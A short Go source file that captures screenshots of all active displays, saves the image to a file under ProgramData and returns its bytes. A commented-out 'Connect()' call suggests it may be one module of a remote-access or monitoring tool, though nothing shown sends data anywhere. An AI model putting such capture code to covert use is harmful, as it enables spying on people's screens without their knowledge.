package screenshot

import (
	"github.com/kbinani/screenshot"
	"image/png"
	"io/ioutil"
	"os"
)

func ScreenShot() []byte {
	// Create a path to save screenshto
	pathToSaveScreenshot := os.Getenv("systemdrive")+"\\ProgramData\\screenshot.png"
//	log.Print(pathToSaveScreenshot)
	// Run func to get screenshot
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			//Connect()
		}
		file, _ := os.Create(pathToSaveScreenshot)
		defer file.Close()
		png.Encode(file, img)
	}
	// end func to get screenshot

	// Read screenshot file
	file, err := ioutil.ReadFile(pathToSaveScreenshot)
	if err != nil {
		return nil
	}
	return file
}
